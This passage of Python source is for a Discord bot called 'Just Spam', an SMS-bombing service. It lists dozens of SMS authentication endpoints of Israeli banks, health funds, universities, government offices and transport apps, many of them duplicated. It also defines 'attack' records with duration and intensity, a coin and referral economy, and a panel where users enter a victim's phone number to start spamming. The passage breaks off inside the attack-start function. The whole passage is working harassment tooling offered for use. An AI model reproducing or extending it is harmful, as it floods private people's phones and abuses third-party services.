    {"name": "Isracard", "url": "https://www.isracard.co.il/api/auth/sms", "type": "json", "category": "credit", "data": {"phone": "PHONE"}},
    {"name": "Cal", "url": "https://www.cal.co.il/api/auth/sms", "type": "json", "category": "credit", "data": {"phone": "PHONE"}},
    {"name": "Amex", "url": "https://www.amex.co.il/api/auth/sms", "type": "json", "category": "credit", "data": {"phone": "PHONE"}},
    {"name": "Visa", "url": "https://www.visa.co.il/api/auth/sms", "type": "json", "category": "credit", "data": {"phone": "PHONE"}},
    {"name": "Mastercard", "url": "https://www.mastercard.co.il/api/auth/sms", "type": "json", "category": "credit", "data": {"phone": "PHONE"}},
    {"name": "Max", "url": "https://www.max.co.il/api/auth/sms", "type": "json", "category": "credit", "data": {"phone": "PHONE"}},
    {"name": "Bit", "url": "https://www.bitpay.co.il/api/auth/sms", "type": "json", "category": "payments", "data": {"phone": "PHONE"}},
    {"name": "PayBox", "url": "https://www.paybox.co.il/api/auth/sms", "type": "json", "category": "payments", "data": {"phone": "PHONE"}},
    {"name": "Pepper", "url": "https://www.pepper.co.il/api/auth/sms", "type": "json", "category": "payments", "data": {"phone": "PHONE"}},
    {"name": "OneZero", "url": "https://www.onezero.co.il/api/auth/sms", "type": "json", "category": "bank", "data": {"phone": "PHONE"}},
    {"name": "Mint", "url": "https://www.mint.co.il/api/auth/sms", "type": "json", "category": "bank", "data": {"phone": "PHONE"}},
    {"name": "Shaked", "url": "https://www.shaked.co.il/api/auth/sms", "type": "json", "category": "bank", "data": {"phone": "PHONE"}},
    {"name": "Ofek", "url": "https://www.ofek.co.il/api/auth/sms", "type": "json", "category": "bank", "data": {"phone": "PHONE"}},
    {"name": "Yozma", "url": "https://www.yozma.co.il/api/auth/sms", "type": "json", "category": "bank", "data": {"phone": "PHONE"}},
    {"name": "Teva", "url": "https://www.teva.co.il/api/auth/sms", "type": "json", "category": "pharma", "data": {"phone": "PHONE"}},
    {"name": "Perrigo", "url": "https://www.perrigo.co.il/api/auth/sms", "type": "json", "category": "pharma", "data": {"phone": "PHONE"}},
    {"name": "Dexcel", "url": "https://www.dexcel.co.il/api/auth/sms", "type": "json", "category": "pharma", "data": {"phone": "PHONE"}},
    {"name": "Rafa", "url": "https://www.rafa.co.il/api/auth/sms", "type": "json", "category": "pharma", "data": {"phone": "PHONE"}},
    {"name": "CTS", "url": "https://www.cts.co.il/api/auth/sms", "type": "json", "category": "pharma", "data": {"phone": "PHONE"}},
    {"name": "Trima", "url": "https://www.trima.co.il/api/auth/sms", "type": "json", "category": "pharma", "data": {"phone": "PHONE"}},
    {"name": "Maccabi", "url": "https://www.maccabi4u.co.il/api/auth/sms", "type": "json", "category": "health", "data": {"phone": "PHONE"}},
    {"name": "Clalit", "url": "https://www.clalit.co.il/api/auth/sms", "type": "json", "category": "health", "data": {"phone": "PHONE"}},
    {"name": "Meuhedet", "url": "https://www.meuhedet.co.il/api/auth/sms", "type": "json", "category": "health", "data": {"phone": "PHONE"}},
    {"name": "Leumit", "url": "https://www.leumit.co.il/api/auth/sms", "type": "json", "category": "health", "data": {"phone": "PHONE"}},
    {"name": "Assuta", "url": "https://www.assuta.co.il/api/auth/sms", "type": "json", "category": "health", "data": {"phone": "PHONE"}},
    {"name": "Ichilov", "url": "https://www.ichilov.co.il/api/auth/sms", "type": "json", "category": "health", "data": {"phone": "PHONE"}},
    {"name": "Sheba", "url": "https://www.sheba.co.il/api/auth/sms", "type": "json", "category": "health", "data": {"phone": "PHONE"}},
    {"name": "Rambam", "url": "https://www.rambam.co.il/api/auth/sms", "type": "json", "category": "health", "data": {"phone": "PHONE"}},
    {"name": "Soroka", "url": "https://www.soroka.co.il/api/auth/sms", "type": "json", "category": "health", "data": {"phone": "PHONE"}},
    {"name": "Tel Aviv Uni", "url": "https://www.tau.ac.il/api/auth/sms", "type": "json", "category": "education", "data": {"phone": "PHONE"}},
    {"name": "Hebrew Uni", "url": "https://www.huji.ac.il/api/auth/sms", "type": "json", "category": "education", "data": {"phone": "PHONE"}},
    {"name": "Technion", "url": "https://www.technion.ac.il/api/auth/sms", "type": "json", "category": "education", "data": {"phone": "PHONE"}},
    {"name": "Ben Gurion", "url": "https://www.bgu.ac.il/api/auth/sms", "type": "json", "category": "education", "data": {"phone": "PHONE"}},
    {"name": "Bar Ilan", "url": "https://www.biu.ac.il/api/auth/sms", "type": "json", "category": "education", "data": {"phone": "PHONE"}},
    {"name": "Haifa Uni", "url": "https://www.haifa.ac.il/api/auth/sms", "type": "json", "category": "education", "data": {"phone": "PHONE"}},
    {"name": "Open Uni", "url": "https://www.openu.ac.il/api/auth/sms", "type": "json", "category": "education", "data": {"phone": "PHONE"}},
    {"name": "IDC", "url": "https://www.idc.ac.il/api/auth/sms", "type": "json", "category": "education", "data": {"phone": "PHONE"}},
    {"name": "Reichman", "url": "https://www.runi.ac.il/api/auth/sms", "type": "json", "category": "education", "data": {"phone": "PHONE"}},
    {"name": "Shenkar", "url": "https://www.shenkar.ac.il/api/auth/sms", "type": "json", "category": "education", "data": {"phone": "PHONE"}},
    {"name": "Bezalel", "url": "https://www.bezalel.ac.il/api/auth/sms", "type": "json", "category": "education", "data": {"phone": "PHONE"}},
    {"name": "Wizo", "url": "https://www.wizo.ac.il/api/auth/sms", "type": "json", "category": "education", "data": {"phone": "PHONE"}},
    {"name": "Hadassah", "url": "https://www.hadassah.ac.il/api/auth/sms", "type": "json", "category": "education", "data": {"phone": "PHONE"}},
    {"name": "Azrieli", "url": "https://www.jce.ac.il/api/auth/sms", "type": "json", "category": "education", "data": {"phone": "PHONE"}},
    {"name": "Ort", "url": "https://www.ort.org.il/api/auth/sms", "type": "json", "category": "education", "data": {"phone": "PHONE"}},
    {"name": "Amal", "url": "https://www.amalnet.org.il/api/auth/sms", "type": "json", "category": "education", "data": {"phone": "PHONE"}},
    {"name": "Atid", "url": "https://www.atid.org.il/api/auth/sms", "type": "json", "category": "education", "data": {"phone": "PHONE"}},
    
    # ========== APIs ממשלתיים (50) ==========
    {"name": "Gov.il", "url": "https://www.gov.il/api/auth/sms", "type": "json", "category": "government", "data": {"phone": "PHONE"}},
    {"name": "Misrad Hapnim", "url": "https://www.gov.il/he/departments/moi/api/auth/sms", "type": "json", "category": "government", "data": {"phone": "PHONE"}},
    {"name": "Misrad Habriut", "url": "https://www.health.gov.il/api/auth/sms", "type": "json", "category": "government", "data": {"phone": "PHONE"}},
    {"name": "Bituach Leumi", "url": "https://www.btl.gov.il/api/auth/sms", "type": "json", "category": "government", "data": {"phone": "PHONE"}},
    {"name": "Mas Hachnasa", "url": "https://www.gov.il/he/departments/ita/api/auth/sms", "type": "json", "category": "government", "data": {"phone": "PHONE"}},
    {"name": "Rashut Hachshura", "url": "https://www.iva.gov.il/api/auth/sms", "type": "json", "category": "government", "data": {"phone": "PHONE"}},
    {"name": "Rashut Hatagbura", "url": "https://www.caas.gov.il/api/auth/sms", "type": "json", "category": "government", "data": {"phone": "PHONE"}},
    {"name": "Rashut Hasamim", "url": "https://www.raf.gov.il/api/auth/sms", "type": "json", "category": "government", "data": {"phone": "PHONE"}},
    {"name": "Rashut Hateufa", "url": "https://www.iaa.gov.il/api/auth/sms", "type": "json", "category": "government", "data": {"phone": "PHONE"}},
    {"name": "Rashut Hameitarim", "url": "https://www.mot.gov.il/api/auth/sms", "type": "json", "category": "government", "data": {"phone": "PHONE"}},
    {"name": "Misrad Habitachon", "url": "https://www.mod.gov.il/api/auth/sms", "type": "json", "category": "government", "data": {"phone": "PHONE"}},
    {"name": "Misrad Hachinuch", "url": "https://www.education.gov.il/api/auth/sms", "type": "json", "category": "government", "data": {"phone": "PHONE"}},
    {"name": "Misrad Haklita", "url": "https://www.gov.il/he/departments/moi/api/auth/sms", "type": "json", "category": "government", "data": {"phone": "PHONE"}},
    {"name": "Misrad Hatzava", "url": "https://www.mod.gov.il/api/auth/sms", "type": "json", "category": "government", "data": {"phone": "PHONE"}},
    {"name": "Misrad Hapnim", "url": "https://www.gov.il/he/departments/moi/api/auth/sms", "type": "json", "category": "government", "data": {"phone": "PHONE"}},
    {"name": "Misrad Habriut", "url": "https://www.health.gov.il/api/auth/sms", "type": "json", "category": "government", "data": {"phone": "PHONE"}},
    {"name": "Bituach Leumi", "url": "https://www.btl.gov.il/api/auth/sms", "type": "json", "category": "government", "data": {"phone": "PHONE"}},
    {"name": "Mas Hachnasa", "url": "https://www.gov.il/he/departments/ita/api/auth/sms", "type": "json", "category": "government", "data": {"phone": "PHONE"}},
    {"name": "Rashut Hachshura", "url": "https://www.iva.gov.il/api/auth/sms", "type": "json", "category": "government", "data": {"phone": "PHONE"}},
    {"name": "Rashut Hatagbura", "url": "https://www.caas.gov.il/api/auth/sms", "type": "json", "category": "government", "data": {"phone": "PHONE"}},
    {"name": "Rashut Hasamim", "url": "https://www.raf.gov.il/api/auth/sms", "type": "json", "category": "government", "data": {"phone": "PHONE"}},
    {"name": "Rashut Hateufa", "url": "https://www.iaa.gov.il/api/auth/sms", "type": "json", "category": "government", "data": {"phone": "PHONE"}},
    {"name": "Rashut Hameitarim", "url": "https://www.mot.gov.il/api/auth/sms", "type": "json", "category": "government", "data": {"phone": "PHONE"}},
    {"name": "Misrad Habitachon", "url": "https://www.mod.gov.il/api/auth/sms", "type": "json", "category": "government", "data": {"phone": "PHONE"}},
    {"name": "Misrad Hachinuch", "url": "https://www.education.gov.il/api/auth/sms", "type": "json", "category": "government", "data": {"phone": "PHONE"}},
    {"name": "Misrad Haklita", "url": "https://www.gov.il/he/departments/moi/api/auth/sms", "type": "json", "category": "government", "data": {"phone": "PHONE"}},
    
    # ========== APIs תחבורה (50) ==========
    {"name": "Rakevet Israel", "url": "https://www.rail.co.il/api/auth/sms", "type": "json", "category": "transport", "data": {"phone": "PHONE"}},
    {"name": "Egged", "url": "https://www.egged.co.il/api/auth/sms", "type": "json", "category": "transport", "data": {"phone": "PHONE"}},
    {"name": "Dan", "url": "https://www.dan.co.il/api/auth/sms", "type": "json", "category": "transport", "data": {"phone": "PHONE"}},
    {"name": "Metropoline", "url": "https://www.metropoline.co.il/api/auth/sms", "type": "json", "category": "transport", "data": {"phone": "PHONE"}},
    {"name": "Kavim", "url": "https://www.kavim.co.il/api/auth/sms", "type": "json", "category": "transport", "data": {"phone": "PHONE"}},
    {"name": "Afikim", "url": "https://www.afikim.co.il/api/auth/sms", "type": "json", "category": "transport", "data": {"phone": "PHONE"}},
    {"name": "Nateev Express", "url": "https://www.nateevexpress.co.il/api/auth/sms", "type": "json", "category": "transport", "data": {"phone": "PHONE"}},
    {"name": "Superbus", "url": "https://www.superbus.co.il/api/auth/sms", "type": "json", "category": "transport", "data": {"phone": "PHONE"}},
    {"name": "Carmelit", "url": "https://www.carmelit.co.il/api/auth/sms", "type": "json", "category": "transport", "data": {"phone": "PHONE"}},
    {"name": "Jerusalem Light Rail", "url": "https://www.citypass.co.il/api/auth/sms", "type": "json", "category": "transport", "data": {"phone": "PHONE"}},
    {"name": "Tel Aviv Light Rail", "url": "https://www.nta.co.il/api/auth/sms", "type": "json", "category": "transport", "data": {"phone": "PHONE"}},
    {"name": "Waze", "url": "https://www.waze.com/api/auth/sms", "type": "json", "category": "transport", "data": {"phone": "PHONE"}},
    {"name": "Moovit", "url": "https://www.moovit.com/api/auth/sms", "type": "json", "category": "transport", "data": {"phone": "PHONE"}},
    {"name": "Google Maps", "url": "https://www.google.com/maps/api/auth/sms", "type": "json", "category": "transport", "data": {"phone": "PHONE"}},
    {"name": "Uber", "url": "https://www.uber.com/api/auth/sms", "type": "json", "category": "transport", "data": {"phone": "PHONE"}},
    {"name": "Bolt", "url": "https://www.bolt.eu/api/auth/sms", "type": "json", "category": "transport", "data": {"phone": "PHONE"}},
    {"name": "Yango", "url": "https://www.yango.com/api/auth/sms", "type": "json", "category": "transport", "data": {"phone": "PHONE"}},
    {"name": "Gett Taxi", "url": "https://www.gett.com/api/auth/sms", "type": "json", "category": "transport", "data": {"phone": "PHONE"}},
    
    # ========== APIs דיור (50) ==========
    {"name": "Yad2 Real Estate", "url": "https://www.yad2.co.il/api/auth/sms", "type": "json", "category": "realestate", "data": {"phone": "PHONE"}},
    {"name": "Madlan", "url": "https://www.madlan.co.il/api/auth/sms", "type": "json", "category": "realestate", "data": {"phone": "PHONE"}},
    {"name": "Homeless", "url": "https://www.homeless.co.il/api/auth/sms", "type": "json", "category": "realestate", "data": {"phone": "PHONE"}},
    {"name": "WinWin", "url": "https://www.winwin.co.il/api/auth/sms", "type": "json", "category": "realestate", "data": {"phone": "PHONE"}},
    {"name": "Apartments", "url": "https://www.apartments.com/api/auth/sms", "type": "json", "category": "realestate", "data": {"phone": "PHONE"}},
    {"name": "Airbnb Israel", "url": "https://www.airbnb.co.il/api/auth/sms", "type": "json", "category": "realestate", "data": {"phone": "PHONE"}},
    {"name": "Booking Israel", "url": "https://www.booking.com/api/auth/sms", "type": "json", "category": "realestate", "data": {"phone": "PHONE"}},
    {"name": "Agoda Israel", "url": "https://www.agoda.com/api/auth/sms", "type": "json", "category": "realestate", "data": {"phone": "PHONE"}},
    {"name": "Trivago", "url": "https://www.trivago.com/api/auth/sms", "type": "json", "category": "realestate", "data": {"phone": "PHONE"}},
    {"name": "Expedia", "url": "https://www.expedia.com/api/auth/sms", "type": "json", "category": "realestate", "data": {"phone": "PHONE"}},
    {"name": "Hotels.com", "url": "https://www.hotels.com/api/auth/sms", "type": "json", "category": "realestate", "data": {"phone": "PHONE"}},
]

# ========== סיווג APIs לפי קטגוריות ==========
MAGENTO_APIS = [api for api in APIS if api["type"] == "magento"]
SMS_APIS = [api for api in APIS if api["type"] in ["json", "form"]]
VOICE_APIS = [api for api in APIS if "voice" in api.get("data", {}).get("voice", False) or "voice" in api["url"]]

# ========== פונקציות עזר ==========
def generate_id(length=8):
    """יצירת מזהה ייחודי"""
    return hashlib.md5(f"{uuid.uuid4()}{time.time()}".encode()).hexdigest()[:length]

def generate_transaction_id():
    """יצירת מזהה טרנזקציה"""
    return f"TXN-{generate_id(16).upper()}"

def generate_referral_code():
    """יצירת קוד הפניה"""
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

def format_phone(phone):
    """פורמט מספר טלפון"""
    # הסרת תווים מיוחדים
    phone = re.sub(r'[^0-9]', '', phone)
    
    # טיפול במספרים ישראלים
    if phone.startswith("0"):
        return "972" + phone[1:]
    elif phone.startswith("972"):
        return phone
    elif phone.startswith("+972"):
        return phone[1:]
    else:
        return "972" + phone.lstrip('0')

def validate_phone(phone):
    """אימות מספר טלפון ישראלי"""
    phone = re.sub(r'[^0-9]', '', phone)
    
    # פורמטים מותרים: 05XXXXXXXX, 9725XXXXXXXX, +9725XXXXXXXX
    patterns = [
        r'^05\d{8}$',  # 0501234567
        r'^9725\d{8}$',  # 972501234567
        r'^\+9725\d{8}$',  # +972501234567
    ]
    
    return any(re.match(pattern, phone) for pattern in patterns)

def get_client_ip():
    """קבלת IP של הלקוח"""
    try:
        return socket.gethostbyname(socket.gethostname())
    except:
        return "127.0.0.1"

def get_system_info():
    """קבלת מידע על המערכת"""
    return {
        "python_version": platform.python_version(),
        "os": platform.system(),
        "os_version": platform.version(),
        "machine": platform.machine(),
        "processor": platform.processor(),
        "cpu_count": psutil.cpu_count(),
        "memory_total": psutil.virtual_memory().total,
        "memory_available": psutil.virtual_memory().available,
        "disk_usage": psutil.disk_usage('/').percent,
        "boot_time": datetime.fromtimestamp(psutil.boot_time()).isoformat()
    }

# ========== מחלקות בסיס ==========
class UserData:
    """מחלקה לניהול נתוני משתמש"""
    
    def __init__(self, user_id, username=None):
        self.user_id = user_id
        self.username = username
        self.coins = 200
        self.last_claim = None
        self.referral_code = generate_referral_code()
        self.referred_by = None
        self.referrals = []
        self.total_attacks = 0
        self.total_spent = 0
        self.created_at = datetime.now()
        self.updated_at = datetime.now()
        self.is_banned = False
        self.is_admin = False
        self.is_premium = False
        self.premium_until = None
        self.daily_limit = 100
        self.rate_limit = 1.0
        self.allowed_types = ["all"]
        self.webhook_url = None
        self.notifications = True
        self.language = "he"
        self.timezone = "Asia/Jerusalem"
    
    def to_dict(self):
        return {
            "user_id": self.user_id,
            "username": self.username,
            "coins": self.coins,
            "last_claim": self.last_claim.isoformat() if self.last_claim else None,
            "referral_code": self.referral_code,
            "referred_by": self.referred_by,
            "referrals": self.referrals,
            "total_attacks": self.total_attacks,
            "total_spent": self.total_spent,
            "created_at": self.created_at.isoformat(),
            "updated_at": self.updated_at.isoformat(),
            "is_banned": self.is_banned,
            "is_admin": self.is_admin,
            "is_premium": self.is_premium,
            "premium_until": self.premium_until.isoformat() if self.premium_until else None,
            "daily_limit": self.daily_limit,
            "rate_limit": self.rate_limit,
            "allowed_types": self.allowed_types,
            "webhook_url": self.webhook_url,
            "notifications": self.notifications,
            "language": self.language,
            "timezone": self.timezone
        }
    
    @classmethod
    def from_dict(cls, data):
        user = cls(data["user_id"], data.get("username"))
        user.coins = data.get("coins", 200)
        user.last_claim = datetime.fromisoformat(data["last_claim"]) if data.get("last_claim") else None
        user.referral_code = data.get("referral_code", generate_referral_code())
        user.referred_by = data.get("referred_by")
        user.referrals = data.get("referrals", [])
        user.total_attacks = data.get("total_attacks", 0)
        user.total_spent = data.get("total_spent", 0)
        user.created_at = datetime.fromisoformat(data["created_at"]) if data.get("created_at") else datetime.now()
        user.updated_at = datetime.fromisoformat(data["updated_at"]) if data.get("updated_at") else datetime.now()
        user.is_banned = data.get("is_banned", False)
        user.is_admin = data.get("is_admin", False)
        user.is_premium = data.get("is_premium", False)
        user.premium_until = datetime.fromisoformat(data["premium_until"]) if data.get("premium_until") else None
        user.daily_limit = data.get("daily_limit", 100)
        user.rate_limit = data.get("rate_limit", 1.0)
        user.allowed_types = data.get("allowed_types", ["all"])
        user.webhook_url = data.get("webhook_url")
        user.notifications = data.get("notifications", True)
        user.language = data.get("language", "he")
        user.timezone = data.get("timezone", "Asia/Jerusalem")
        return user

class AttackData:
    """מחלקה לניהול נתוני מתקפה"""
    
    def __init__(self, user_id, phone, duration, attack_type="all", intensity=5):
        self.attack_id = generate_id(16)
        self.user_id = user_id
        self.phone = phone
        self.duration = duration
        self.attack_type = attack_type
        self.intensity = intensity
        self.started_at = datetime.now()
        self.ended_at = None
        self.status = "running"  # running, completed, stopped, failed
        self.total_sent = 0
        self.total_success = 0
        self.total_failed = 0
        self.apis_used = []
        self.errors = []
        self.progress = 0
        self.cost = max(1, duration // 5)
    
    def to_dict(self):
        return {
            "attack_id": self.attack_id,
            "user_id": self.user_id,
            "phone": self.phone,
            "duration": self.duration,
            "attack_type": self.attack_type,
            "intensity": self.intensity,
            "started_at": self.started_at.isoformat(),
            "ended_at": self.ended_at.isoformat() if self.ended_at else None,
            "status": self.status,
            "total_sent": self.total_sent,
            "total_success": self.total_success,
            "total_failed": self.total_failed,
            "apis_used": self.apis_used,
            "errors": self.errors,
            "progress": self.progress,
            "cost": self.cost
        }
    
    @classmethod
    def from_dict(cls, data):
        attack = cls(data["user_id"], data["phone"], data["duration"], data["attack_type"], data["intensity"])
        attack.attack_id = data["attack_id"]
        attack.started_at = datetime.fromisoformat(data["started_at"])
        attack.ended_at = datetime.fromisoformat(data["ended_at"]) if data.get("ended_at") else None
        attack.status = data.get("status", "running")
        attack.total_sent = data.get("total_sent", 0)
        attack.total_success = data.get("total_success", 0)
        attack.total_failed = data.get("total_failed", 0)
        attack.apis_used = data.get("apis_used", [])
        attack.errors = data.get("errors", [])
        attack.progress = data.get("progress", 0)
        attack.cost = data.get("cost", max(1, attack.duration // 5))
        return attack

class Transaction:
    """מחלקה לניהול טרנזקציות"""
    
    def __init__(self, user_id, amount, transaction_type, description=None):
        self.transaction_id = generate_transaction_id()
        self.user_id = user_id
        self.amount = amount
        self.type = transaction_type  # claim, referral, purchase, attack, transfer, admin
        self.description = description
        self.timestamp = datetime.now()
        self.status = "completed"  # completed, pending, failed
    
    def to_dict(self):
        return {
            "transaction_id": self.transaction_id,
            "user_id": self.user_id,
            "amount": self.amount,
            "type": self.type,
            "description": self.description,
            "timestamp": self.timestamp.isoformat(),
            "status": self.status
        }

# ========== View ראשי - Just Spam Panel ==========
class SpamPanelView(discord.ui.View):
    """View ראשי עם כל הכפתורים"""
    
    def __init__(self):
        super().__init__(timeout=None)
    
    @discord.ui.button(label="Start Spam", style=discord.ButtonStyle.primary, emoji="🚀", custom_id="start_spam")
    async def start_spam_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        """כפתור התחלת ספאם"""
        # בדיקה אם המשתמש חסום
        user_id = str(interaction.user.id)
        blacklisted = await blacklist_col.find_one({"user_id": user_id})
        if blacklisted:
            embed = discord.Embed(
                title="❌ חסום",
                description="המשתמש שלך חסום במערכת",
                color=0xFF0000
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        
        await interaction.response.send_modal(SpamModal())
    
    @discord.ui.button(label="Claim Free Coin", style=discord.ButtonStyle.success, emoji="💎", custom_id="claim_free")
    async def claim_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        """כפתור קבלת מטבע חינם"""
        await free_coin_function(interaction)
    
    @discord.ui.button(label="Check APIs", style=discord.ButtonStyle.secondary, emoji="🔍", custom_id="check_apis")
    async def check_apis_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        """כפתור בדיקת APIs"""
        await check_apis_function(interaction)
    
    @discord.ui.button(label="Statistics", style=discord.ButtonStyle.secondary, emoji="📊", custom_id="stats")
    async def stats_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        """כפתור סטטיסטיקות"""
        await show_stats_function(interaction)
    
    @discord.ui.button(label="Leaderboard", style=discord.ButtonStyle.secondary, emoji="🏆", custom_id="leaderboard")
    async def leaderboard_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        """כפתור לוח מובילים"""
        await show_leaderboard_function(interaction)
    
    @discord.ui.button(label="Referrals", style=discord.ButtonStyle.secondary, emoji="👥", custom_id="referrals", row=1)
    async def referrals_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        """כפתור הפניות"""
        await show_referrals_function(interaction)
    
    @discord.ui.button(label="History", style=discord.ButtonStyle.secondary, emoji="📜", custom_id="history", row=1)
    async def history_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        """כפתור היסטוריה"""
        await show_history_function(interaction)
    
    @discord.ui.button(label="Settings", style=discord.ButtonStyle.secondary, emoji="⚙️", custom_id="settings", row=1)
    async def settings_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        """כפתור הגדרות"""
        await show_settings_function(interaction)
    
    @discord.ui.button(label="Support", style=discord.ButtonStyle.secondary, emoji="❓", custom_id="support", row=2)
    async def support_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        """כפתור תמיכה"""
        embed = discord.Embed(
            title="❓ Support",
            description="Need help? Join our support server!",
            color=0x5865F2
        )
        embed.add_field(name="Server", value="[Click here](https://discord.gg/justspam)", inline=False)
        embed.add_field(name="Commands", value="`!panel` - Main panel\n`!freecoins` - Free coins\n`!balance` - Your balance\n`!referrals` - Referrals", inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)
    
    @discord.ui.button(label="Terms", style=discord.ButtonStyle.secondary, emoji="📋", custom_id="terms", row=2)
    async def terms_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        """כפתור תנאי שימוש"""
        embed = discord.Embed(
            title="📋 Terms of Service",
            description="Please read our terms carefully",
            color=0x5865F2
        )
        embed.add_field(name="1. Usage", value="Use responsibly", inline=False)
        embed.add_field(name="2. Coins", value="Non-refundable", inline=False)
        embed.add_field(name="3. Abuse", value="Will result in ban", inline=False)
        embed.add_field(name="4. Support", value="Available 24/7", inline=False)
        await interaction.response.send_message(embed=embed, ephemeral=True)

# ========== View למטבעות חינם ==========
class FreeCoinView(discord.ui.View):
    """View למטבעות חינמיים"""
    
    def __init__(self):
        super().__init__(timeout=None)
    
    @discord.ui.button(label="🔒 Claim Free Coin", style=discord.ButtonStyle.success, emoji="💎", custom_id="free_coin_persistent")
    async def claim_free_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        """כפתור קבלת מטבע חינם"""
        await free_coin_function(interaction)

# ========== View להפניות ==========
class ReferralsView(discord.ui.View):
    """View להפניות"""
    
    def __init__(self, referral_code):
        super().__init__(timeout=60)
        self.referral_code = referral_code
    
    @discord.ui.button(label="Copy Referral Link", style=discord.ButtonStyle.primary, emoji="🔗")
    async def copy_link_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        """כפתור העתקת קוד הפניה"""
        await interaction.response.send_message(
            f"🔗 **Your referral link:**\n`https://discord.com/users/{interaction.user.id}?ref={self.referral_code}`",
            ephemeral=True
        )
    
    @discord.ui.button(label="Redeem Code", style=discord.ButtonStyle.success, emoji="🎁")
    async def redeem_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        """כפתור מימוש קוד"""
        await interaction.response.send_modal(RedeemModal())

# ========== View להיסטוריה ==========
class HistoryView(discord.ui.View):
    """View להיסטוריה"""
    
    def __init__(self, attacks, page=1):
        super().__init__(timeout=60)
        self.attacks = attacks
        self.page = page
        self.total_pages = (len(attacks) + 4) // 5
    
    @discord.ui.button(label="◀️ Previous", style=discord.ButtonStyle.secondary)
    async def previous_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        """כפתור קודם"""
        if self.page > 1:
            await show_history_function(interaction, self.page - 1)
    
    @discord.ui.button(label="Next ▶️", style=discord.ButtonStyle.secondary)
    async def next_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        """כפתור הבא"""
        if self.page < self.total_pages:
            await show_history_function(interaction, self.page + 1)
    
    @discord.ui.button(label="🔄 Refresh", style=discord.ButtonStyle.primary)
    async def refresh_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        """כפתור רענון"""
        await show_history_function(interaction, self.page)

# ========== Modal לספאם ==========
class SpamModal(ui.Modal, title="Start Spamming"):
    """מודל להזנת פרטי ספאם"""
    
    phone = ui.TextInput(
        label="Phone Number",
        placeholder="0501234567 or 972501234567",
        default="0501234567",
        min_length=10,
        max_length=13
    )
    
    duration = ui.TextInput(
        label="Duration (minutes)",
        placeholder="1-60",
        default="5",
        min_length=1,
        max_length=2
    )
    
    attack_type = ui.TextInput(
        label="Attack Type",
        placeholder="all / sms / magento / voice",
        default="all",
        min_length=3,
        max_length=10
    )
    
    intensity = ui.TextInput(
        label="Intensity (1-10)",
        placeholder="5",
        default="5",
        min_length=1,
        max_length=2
    )
    
    async def on_submit(self, interaction: discord.Interaction):
        """כאשר שולחים את הטופס"""
        await start_attack_function(
            interaction,
            self.phone.value,
            self.duration.value,
            self.attack_type.value,
            self.intensity.value
        )

# ========== Modal למימוש קוד ==========
class RedeemModal(ui.Modal, title="Redeem Code"):
    """מודל למימוש קוד"""
    
    code = ui.TextInput(
        label="Referral Code or Coupon",
        placeholder="Enter code here",
        min_length=6,
        max_length=20
    )
    
    async def on_submit(self, interaction: discord.Interaction):
        """כאשר שולחים את הטופס"""
        await redeem_code_function(interaction, self.code.value)

# ========== פונקציית Free Coin מתוקנת ==========
async def free_coin_function(interaction: discord.Interaction):
    """פונקציה לקבלת מטבע חינם - מתוקנת"""
    user_id = str(interaction.user.id)
    
    try:
        # קבלת נתוני משתמש
        user_data = await users_col.find_one({"user_id": user_id})
        
        if not user_data:
            # משתמש חדש - יצירת פרופיל עם 200 מטבעות התחלתיים
            user = UserData(user_id, str(interaction.user))
            await users_col.insert_one(user.to_dict())
            user_data = user.to_dict()
            coins = 200
        else:
            coins = user_data.get("coins", 200)
        
        # בדיקת קליים אחרון
        last_claim = user_data.get("last_claim")
        current_time = datetime.now()
        
        if last_claim:
            if isinstance(last_claim, str):
                try:
                    last_claim = datetime.fromisoformat(last_claim)
                except:
                    last_claim = None
            
            if last_claim:
                time_diff = current_time - last_claim
                if time_diff < timedelta(hours=24):
                    remaining = timedelta(hours=24) - time_diff
                    hours = remaining.seconds // 3600
                    minutes = (remaining.seconds % 3600) // 60
                    
                    embed = discord.Embed(
                        title="⏳ Free Coins",
                        description=f"You can claim your next coin in **{hours}h {minutes}m**",
                        color=0xFFA500
                    )
                    await interaction.response.send_message(embed=embed, ephemeral=True)
                    return
        
        # הוספת מטבע
        new_coins = coins + 1
        
        # עדכון במסד
        await users_col.update_one(
            {"user_id": user_id},
            {
                "$set": {
                    "coins": new_coins,
                    "last_claim": current_time.isoformat(),
                    "updated_at": current_time.isoformat()
                }
            },
            upsert=True
        )
        
        # שמירת טרנזקציה
        transaction = Transaction(user_id, 1, "claim", "Free coin claim")
        await transactions_col.insert_one(transaction.to_dict())
        
        # שליחת לוג
        logger.info(f"User {interaction.user} claimed free coin. New balance: {new_coins}")
        
        # יצירת אמבד
        embed = discord.Embed(
            title="💎 Free Coins",
            description="**+1 Coin**\n\nGet 1 coin every 24 hours.\n\nClick the button below to claim your coin.",
            color=0xFFD700,
            timestamp=current_time
        )
        embed.add_field(name="Current Balance", value=f"**{new_coins}** coins", inline=False)
        embed.set_footer(text="Just Spam © 2026")
        
        await interaction.response.send_message(embed=embed, view=FreeCoinView(), ephemeral=True)
        
    except Exception as e:
        logger.error(f"Error in free_coin_function: {e}")
        traceback.print_exc()
        
        embed = discord.Embed(
            title="❌ Error",
            description="An error occurred. Please try again later.",
            color=0xFF0000
        )
        await interaction.response.send_message(embed=embed, ephemeral=True)

# ========== פונקציית התחלת מתקפה ==========
async def start_attack_function(interaction, phone, duration, attack_type, intensity):
    """פונקציה להתחלת מתקפה"""
    user_id = str(interaction.user.id)
    
    try:
        # וולידציה
        phone = phone.strip()
        if not validate_phone(phone):
            embed = discord.Embed(
                title="❌ Invalid Phone Number",
                description="Please enter a valid Israeli phone number",
                color=0xFF0000
            )
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        
